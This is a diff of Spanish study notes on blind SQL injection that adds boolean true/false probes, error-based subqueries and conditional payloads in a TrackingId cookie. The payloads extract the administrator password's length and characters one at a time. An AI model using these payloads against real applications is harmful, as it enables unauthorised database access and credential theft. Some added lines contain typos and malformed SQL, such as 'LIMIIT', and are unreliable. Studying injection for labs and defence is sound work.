@@ -169,13 +169,13 @@ Usualmente puede ser una cookie, por lo que las inyecciones serán a través de 
 - En este tipo de inyección no es tan impportante identificar el tipo de datos ya que solo nos guiaremos a partir del comportamiento, aunque el tipo de dato si debe ser considerado en las consultas que se vayan a realizar
 
 ### Base SQL Blind
-La base de SQL blind es la generación de errores intencionados,  es decir se inyectan consultas verdaders y falsas para poder conocer el comportamiento de la aplicación y aprtir de esto generar subconsultas
+La base de SQL blind es la manipulación sin una respuesta especifica, puede ser tambien a traves de la generación de errores intencionados,  es decir se inyectan consultas verdaders y falsas para poder conocer el comportamiento de la aplicación y aprtir de esto generar subconsultas
 - Existen  los errores de logica 1=2
 - Existen errores de aritmeticos 1/0
-- Errores de sintaxis Selet * from dual;
+- Errores de sintaxis Selet * from dual; substring (1,1 'string')
 
 Los pasos son los siguientes:
-**1** Generación de error de sintaxis
+**1** Generación de error de sintaxis y lógica
 ```
 Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
 El valor del ID es xyz
@@ -185,6 +185,11 @@ Error básico 1: Añadir una comilla simple ' => xyz' => Esto es un error de sin
 Error básico 2: Añadir dos comillas simples ' => xyz' => Esto es como una cadena vacia o un NULL ya que esta indicando el inicio y termino de una cadena vacia
   SELECT ID FROM TRACKING WHERE ID = 'xyz'''
 
+Errores lógicos para validar
+Error confirmación verdadero ' AND '1'='1  ó ' AND '1'='1'-- => Es importante ver el comportamiento cuando se genera una acción adicional
+  SELECT ID FROM TRACKING WHERE ID = 'xyz AND '1'='1' Ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='1'--'
+Error confirmación falso 'AND '1'='2 ó AND ' AND '1'='2'-- => Es importante ver el comportamiento cuando se genera una acción adicional
+  SELECT ID FROM TRACKING WHERE ID = 'xyz'AND '1'='2' ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='2'--
 Lo anterior confirmará que el error de sintaxis tiene efecto en la aplciación
 ```
 **2**Confirmar que la inyección se interpreta como una consulta, es decir que llega al backend
@@ -208,13 +213,24 @@ TrackingId=xyz'||(SELECT '' FROM tabla-imaginaria )||' => Esto genera una subcon
 ```
 **3**Consultas clave
 ```
-Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave
+Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave ejemplos
 
 TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
+
+TrackingId=xyz'||(SELECT '' FROM users WHERE LIMIIT = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
+
 ```
 
 **4**Consultas clave a través de condiciones
+```
+A través de un operador lógico(=,>,<, etc), se genera una consulta para verificar un dato, puede ser su existencia, hasta la enumeración del mismo
+  TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a                                                            =>Verifica la existencia de un parametro
+  TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x            =>Obtiene la longitud de un parametro
+  TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$             =>Enumera un parametro
 
+
+
+```
 
 ### Identificar el tipo de base de datos
 Identificar base de datos
